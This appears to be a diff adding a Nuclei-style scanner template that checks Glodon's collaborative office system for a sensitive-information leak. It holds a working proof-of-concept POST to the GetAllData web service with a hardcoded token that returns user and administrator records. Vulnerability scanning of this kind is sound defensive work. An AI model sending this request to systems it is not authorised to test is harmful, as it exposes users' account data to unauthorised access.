@@ -1,0 +1,33 @@
+id: poc-yaml-glinkworks-GetAllData-sensitive-information-leak
+info:
+  name: 广联达协同办公系统 GetAllData 敏感信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 信息泄露
+  metadata:
+    finger: 广联达协同办公系统
+  description: |
+    This template identifies sensitive information leakage in the 广联达协同办公系统 via the GetAllData API endpoint.
+http:
+  - raw:
+      - |
+        POST /WebService/Lk6SyncService/MrMMSSvc/DataSvc.asmx/GetAllData HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Token=!@#$asdf$#@!&DataType=user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - text/xml
+      - type: word
+        part: body
+        words:
+          - "USR_ID"
+          - "管理员"
+          - "<Result>ok</Result>"
